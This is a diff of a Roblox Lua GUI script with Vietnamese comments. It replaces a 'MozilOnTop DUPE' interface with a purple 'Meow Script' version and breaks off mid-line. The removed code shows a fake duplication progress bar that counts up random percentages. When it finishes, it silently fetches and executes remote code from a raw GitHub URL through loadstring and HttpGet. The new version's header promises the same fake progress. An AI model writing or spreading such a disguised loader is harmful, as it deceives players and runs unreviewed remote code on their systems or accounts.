@@ -1,136 +1,57 @@
---// MozilOnTop DUPE GUI với hiệu ứng progress và màu cầu vồng
+--// Meow Script (phiên bản màu tím, đếm % ngẫu nhiên, hoàn thành ~15s)
 
--- Xóa GUI cũ nếu có
-if game.CoreGui:FindFirstChild("MozilOnTopUI") then
-	game.CoreGui.MozilOnTopUI:Destroy()
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UIS = game:GetService("UserInputService")
+
+if _G.__PHATLEE_HUB then _G.__PHATLEE_HUB:Destroy() end
+
+local function toast(parent, title, msg, dur)
+	dur = dur or 3
+	local t = Instance.new("TextLabel")
+	t.BackgroundColor3 = Color3.fromRGB(120, 100, 240)
+	t.TextColor3 = Color3.fromRGB(255, 255, 255)
+	t.Font = Enum.Font.GothamSemibold
+	t.TextSize = 16
+	t.Text = title.." - "..msg
+	t.AnchorPoint = Vector2.new(0.5,1)
+	t.Position = UDim2.new(0.5,0,0,-10)
+	t.Parent = parent
+	Instance.new("UICorner", t).CornerRadius = UDim.new(0,8)
+	task.delay(dur, function()
+		if t then t:Destroy() end
+	end)
 end
 
--- Tạo ScreenGui
-local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "MozilOnTopUI"
-gui.ResetOnSpawn = false
+local function dragify(handle, target)
+	local dragging, startPos, startInputPos
+	handle.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			startPos = target.Position
+			startInputPos = input.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then dragging = false end
+			end)
+		end
+	end)
+	UIS.InputChanged:Connect(function(input)
+		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+			local delta = input.Position - startInputPos
+			target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		end
+	end)
+end
 
--- Khung chính
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 400, 0, 220)
-frame.Position = UDim2.new(0.5, -200, 0.5, -110)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = gui
+-- GUI chính
+local gui = Instance.new("ScreenGui")
+gui.Name = "MeowScript"
+gui.Parent = CoreGui
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+_G.__PHATLEE_HUB = gui
 
-local corner = Instance.new("UICorner", frame)
-corner.CornerRadius = UDim.new(0, 15)
-
--- Tiêu đề
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 10)
-title.BackgroundTransparency = 1
-title.Text = "MozilOnTop"
-title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-
--- Thanh DUPE
-local dupeBtn = Instance.new("TextButton", frame)
-dupeBtn.Size = UDim2.new(0.9, 0, 0, 50)
-dupeBtn.Position = UDim2.new(0.05, 0, 0.3, 0)
-dupeBtn.Text = "DUPE"
-dupeBtn.Font = Enum.Font.GothamBold
-dupeBtn.TextScaled = true
-dupeBtn.TextColor3 = Color3.new(1, 1, 1)
-dupeBtn.BorderSizePixel = 0
-
-local dupeCorner = Instance.new("UICorner", dupeBtn)
-dupeCorner.CornerRadius = UDim.new(0, 15)
-
-local rainbowGradient = Instance.new("UIGradient", dupeBtn)
-rainbowGradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-	ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 0)),
-	ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 0)),
-	ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 255)),
-	ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
-}
-rainbowGradient.Rotation = 0
-
--- Di chuyển màu cầu vồng
-task.spawn(function()
-	while task.wait(0.03) do
-		rainbowGradient.Rotation = (rainbowGradient.Rotation + 2) % 360
-	end
-end)
-
--- Thanh progress
-local progressBarBG = Instance.new("Frame", frame)
-progressBarBG.Size = UDim2.new(0.9, 0, 0, 40)
-progressBarBG.Position = UDim2.new(0.05, 0, 0.65, 0)
-progressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-progressBarBG.BorderSizePixel = 0
-
-local bgCorner = Instance.new("UICorner", progressBarBG)
-bgCorner.CornerRadius = UDim.new(0, 15)
-
-local progressFill = Instance.new("Frame", progressBarBG)
-progressFill.Size = UDim2.new(0, 0, 1, 0)
-progressFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-progressFill.BorderSizePixel = 0
-
-local fillCorner = Instance.new("UICorner", progressFill)
-fillCorner.CornerRadius = UDim.new(0, 15)
-
-local progressGradient = Instance.new("UIGradient", progressFill)
-progressGradient.Color = rainbowGradient.Color
-progressGradient.Rotation = 0
-
--- Text hiển thị %
-local progressText = Instance.new("TextLabel", progressBarBG)
-progressText.Size = UDim2.new(1, 0, 1, 0)
-progressText.BackgroundTransparency = 1
-progressText.Text = "0% . 15s"
-progressText.Font = Enum.Font.GothamBold
-progressText.TextScaled = true
-progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
-
--- Hiệu ứng màu trên progress
-task.spawn(function()
-	while task.wait(0.03) do
-		progressGradient.Rotation = (progressGradient.Rotation + 2) % 360
-	end
-end)
-
--- Khi ấn nút DUPE
-local processing = false
-
-dupeBtn.MouseButton1Click:Connect(function()
-	if processing then return end
-	processing = true
-	dupeBtn.Text = "Processing..."
-	
-	local progress = 0
-	local timeLeft = 15
-	
-	while progress < 100 do
-		local inc = math.random(3, 8)
-		progress = math.clamp(progress + inc, 0, 100)
-		timeLeft = math.max(0, timeLeft - 1)
-		
-		progressFill:TweenSize(UDim2.new(progress / 100, 0, 1, 0), "Out", "Quad", 0.5, true)
-		progressText.Text = tostring(progress).."% . "..tostring(timeLeft).."s"
-		
-		task.wait(math.random(1, 2)) -- ngẫu nhiên mỗi lần tăng
-	end
-	
-	progressText.Text = "✅ Done!"
-	dupeBtn.Text = "Done!"
-	
-	task.wait(0.5)
-	
-	-- Thực hiện lệnh sau khi xong
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"))()
-	
-	processing = false
-end)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,440,0,240)
+frame.Position = UDim2.new(0.5,-220,0.5,-120)
+frame.BackgroundColor3 = Color3.fromRGB(25, 26, 34)
+frame.BorderSizePixel =
